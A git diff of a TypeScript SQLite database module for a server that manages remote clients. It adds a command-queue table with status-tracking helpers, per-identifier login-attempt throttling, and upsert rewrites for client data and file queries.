@@ -1,7 +1,7 @@
 import crypto from 'crypto';
 import Database from 'better-sqlite3';
 import { drizzle } from 'drizzle-orm/better-sqlite3';
-import { eq, and, desc, sql, count, lt } from 'drizzle-orm';
+import { eq, and, desc, sql, count, lt, inArray } from 'drizzle-orm';
 import * as schema from './schema.js';
 import { paths, ensureDataDir } from '../config/paths.js';
 import { log } from '../utils/logger.js';
@@ -14,6 +14,7 @@ import {
   buildRecords,
   settings,
   loginAttempts,
+  commands,
   jwtSecret,
 } from './schema.js';
 import { ALL_PERMISSIONS, DEFAULT_USER_PERMISSIONS, resolvePermissions } from '../types/index.js';
@@ -143,12 +144,26 @@ export function initDb(): DB {
     CREATE TABLE IF NOT EXISTS login_attempts (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       ip TEXT NOT NULL,
+      identifier TEXT NOT NULL DEFAULT '',
       attempted_at TEXT DEFAULT (datetime('now'))
     );
 
     CREATE TABLE IF NOT EXISTS jwt_secret (
       id INTEGER PRIMARY KEY CHECK (id = 1),
       secret TEXT NOT NULL
+    );
+
+    CREATE TABLE IF NOT EXISTS commands (
+      id TEXT PRIMARY KEY,
+      client_id TEXT NOT NULL,
+      cmd_type TEXT NOT NULL,
+      params TEXT DEFAULT '{}',
+      status TEXT NOT NULL DEFAULT 'sent' CHECK(status IN ('sent', 'delivered', 'responded', 'failed')),
+      sent_at TEXT NOT NULL DEFAULT (datetime('now')),
+      delivered_at TEXT,
+      responded_at TEXT,
+      response_summary TEXT,
+      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
     );
 
     CREATE INDEX IF NOT EXISTS idx_sessions_token ON sessions(token);
@@ -164,9 +179,11 @@ export function initDb(): DB {
     CREATE INDEX IF NOT EXISTS idx_users_username ON users(username);
     CREATE INDEX IF NOT EXISTS idx_users_email ON users(email);
     CREATE INDEX IF NOT EXISTS idx_login_attempts_ip ON login_attempts(ip);
+    CREATE INDEX IF NOT EXISTS idx_login_attempts_identifier ON login_attempts(identifier);
+    CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id, status);
+    CREATE INDEX IF NOT EXISTS idx_commands_sent_at ON commands(sent_at);
   `);
 
-  // Migrate: client_files schema change (file_path/stored_name → data blob)
   try {
     const tableInfo = sqliteDb.pragma('table_info(client_files)') as Array<{ name: string }>;
     const columnNames = tableInfo.map((col) => col.name);
@@ -194,7 +211,6 @@ export function initDb(): DB {
     log.warn(`client_files migration warning: ${err instanceof Error ? err.message : String(err)}`);
   }
 
-  // Migrate: add email, role, and permissions columns if missing
   try {
     const tableInfo = sqliteDb.pragma('table_info(users)') as Array<{ name: string }>;
     const columnNames = tableInfo.map((col) => col.name);
@@ -224,7 +240,18 @@ export function initDb(): DB {
     log.warn(`Migration warning: ${err instanceof Error ? err.message : String(err)}`);
   }
 
-  // Migrate: build_records schema change (progress TEXT → apk_data BLOB + file_size INTEGER)
+  try {
+    const tableInfo = sqliteDb.pragma('table_info(login_attempts)') as Array<{ name: string }>;
+    const columnNames = tableInfo.map((col) => col.name);
+    if (!columnNames.includes('identifier')) {
+      sqliteDb.exec(`ALTER TABLE login_attempts ADD COLUMN identifier TEXT NOT NULL DEFAULT ''`);
+      sqliteDb.exec(`CREATE INDEX IF NOT EXISTS idx_login_attempts_identifier ON login_attempts(identifier)`);
+      log.info('login_attempts: added identifier column');
+    }
+  } catch (err: unknown) {
+    log.warn(`login_attempts migration warning: ${err instanceof Error ? err.message : String(err)}`);
+  }
+
   try {
     const tableInfo = sqliteDb.pragma('table_info(build_records)') as Array<{ name: string }>;
     const columnNames = tableInfo.map((col) => col.name);
@@ -273,24 +300,22 @@ export const dbHelpers = {
       .where(and(eq(clientData.clientId, clientId), eq(clientData.dataType, dataType)))
       .get();
     if (row) return row.data ?? '[]';
-    d.insert(clientData).values({ clientId, dataType, data: '[]' }).run();
-    return '[]';
-  },
 
-  setClientData(clientId: string, dataType: string, data: string): void {
-    const d = getDb();
-    const existing = d.select({ id: clientData.id })
+    d.insert(clientData).values({ clientId, dataType, data: '[]' })
+      .onConflictDoNothing().run();
+    const retry = d.select({ data: clientData.data })
       .from(clientData)
       .where(and(eq(clientData.clientId, clientId), eq(clientData.dataType, dataType)))
       .get();
-    if (existing) {
-      d.update(clientData)
-        .set({ data, updatedAt: new Date().toISOString() })
-        .where(eq(clientData.id, existing.id))
-        .run();
-    } else {
-      d.insert(clientData).values({ clientId, dataType, data }).run();
-    }
+    return retry?.data ?? '[]';
+  },
+
+  setClientData(clientId: string, dataType: string, data: string): void {
+    getDb().insert(clientData).values({ clientId, dataType, data })
+      .onConflictDoUpdate({
+        target: [clientData.clientId, clientData.dataType],
+        set: { data, updatedAt: new Date().toISOString() },
+      }).run();
   },
 
   addClientFile(clientId: string, fileType: string, originalName: string, mimeType: string, data: Buffer, fileSize: number): void {
@@ -301,7 +326,7 @@ export const dbHelpers = {
   },
 
   getClientFiles(clientId: string, fileType: string): Array<{
-    id: number; originalName: string; mimeType: string | null; fileSize: number | null; createdAt: string | null;
+    id: number; originalName: string; mimeType: string | null; fileSize: number | null; createdAt: string | null; fileType: string;
   }> {
     const d = getDb();
     return d.select({
@@ -310,6 +335,7 @@ export const dbHelpers = {
       mimeType: clientFiles.mimeType,
       fileSize: clientFiles.fileSize,
       createdAt: clientFiles.createdAt,
+      fileType: clientFiles.fileType,
     })
       .from(clientFiles)
       .where(and(eq(clientFiles.clientId, clientId), eq(clientFiles.fileType, fileType)))
@@ -320,7 +346,6 @@ export const dbHelpers = {
   addLog(type: string, category: string, message: string, details?: string): void {
     const d = getDb();
     d.insert(logs).values({ type, category, message, details: details || null }).run();
-    // Trim logs periodically (every 100 inserts) to reduce write amplification
     const raw = getSqliteDb();
     const countResult = raw.prepare('SELECT COUNT(*) as cnt FROM logs').get() as { cnt: number };
     if (countResult.cnt > 11000) {
@@ -335,19 +360,28 @@ export const dbHelpers = {
     return result.changes;
   },
 
-  checkLoginAttempts(ip: string, maxAttempts: number, windowMs: number): boolean {
+  checkLoginAttempts(ip: string, maxAttempts: number, windowMs: number, identifier?: string): boolean {
     const d = getDb();
     const cutoff = new Date(Date.now() - windowMs).toISOString();
+
+    const id = identifier || ip;
+    const username = identifier && identifier.includes('|')
+      ? identifier.split('|').slice(1).join('|')
+      : '';
+    const condition = username
+      ? sql`(${loginAttempts.ip} = ${ip} OR ${loginAttempts.identifier} = ${id} OR ${loginAttempts.identifier} LIKE ${'%' + username} AND ${loginAttempts.identifier} LIKE ${'%|' + username})`
+      : sql`(${loginAttempts.ip} = ${ip} OR ${loginAttempts.identifier} = ${id})`;
     const result = d.select({ count: count() })
       .from(loginAttempts)
-      .where(and(eq(loginAttempts.ip, ip), sql`${loginAttempts.attemptedAt} > ${cutoff}`))
+      .where(and(condition, sql`${loginAttempts.attemptedAt} > ${cutoff}`))
       .get();
     return (result?.count ?? 0) >= maxAttempts;
   },
 
-  recordLoginAttempt(ip: string): void {
+  recordLoginAttempt(ip: string, identifier?: string): void {
     const d = getDb();
-    d.insert(loginAttempts).values({ ip }).run();
+    const id = identifier || ip;
+    d.insert(loginAttempts).values({ ip, identifier: id }).run();
   },
 
   cleanLoginAttempts(olderThanMs: number): number {
@@ -444,5 +478,58 @@ export const dbHelpers = {
     const user = d.select({ role: users.role, permissions: users.permissions }).from(users).where(eq(users.id, id)).get();
     if (!user) return [];
     return resolvePermissions(user.role as UserRole, user.permissions);
+  },
+
+  createCommand(id: string, clientId: string, cmdType: string, params: string): void {
+    getDb().insert(commands).values({ id, clientId, cmdType, params, status: 'sent' }).run();
+  },
+
+  updateCommandStatus(id: string, status: 'delivered' | 'responded' | 'failed', summary?: string): void {
+    const updates: Record<string, unknown> = { status };
+    if (status === 'delivered') updates.deliveredAt = new Date().toISOString();
+    if (status === 'responded') {
+      updates.respondedAt = new Date().toISOString();
+      if (summary) updates.responseSummary = summary;
+    }
+    getDb().update(commands).set(updates).where(eq(commands.id, id)).run();
+  },
+
+  getPendingCommandForClient(clientId: string, cmdType: string): { id: string; status: string } | undefined {
+    const d = getDb();
+    return d.select({ id: commands.id, status: commands.status })
+      .from(commands)
+      .where(and(eq(commands.clientId, clientId), eq(commands.cmdType, cmdType), sql`${commands.status} IN ('sent', 'delivered')`))
+      .orderBy(desc(commands.sentAt))
+      .limit(1)
+      .get();
+  },
+
+  markAllPendingCommandsResponded(clientId: string, cmdType: string, summary?: string): string[] {
+    const d = getDb();
+    const pending = d.select({ id: commands.id })
+      .from(commands)
+      .where(and(eq(commands.clientId, clientId), eq(commands.cmdType, cmdType), sql`${commands.status} IN ('sent', 'delivered')`))
+      .all();
+    if (pending.length === 0) return [];
+    const ids = pending.map((p) => p.id);
+    const nowIso = new Date().toISOString();
+
+    d.update(commands).set({
+      status: 'responded',
+      respondedAt: nowIso,
+      responseSummary: summary ?? null,
+    }).where(and(
+      eq(commands.clientId, clientId),
+      eq(commands.cmdType, cmdType),
+      inArray(commands.id, ids),
+    )).run();
+    return ids;
+  },
+
+  cleanOldCommands(maxAgeMs: number = 24 * 60 * 60 * 1000): number {
+    const d = getDb();
+    const cutoff = new Date(Date.now() - maxAgeMs).toISOString();
+    const result = d.delete(commands).where(lt(commands.sentAt, cutoff)).run();
+    return result.changes;
   },
 };
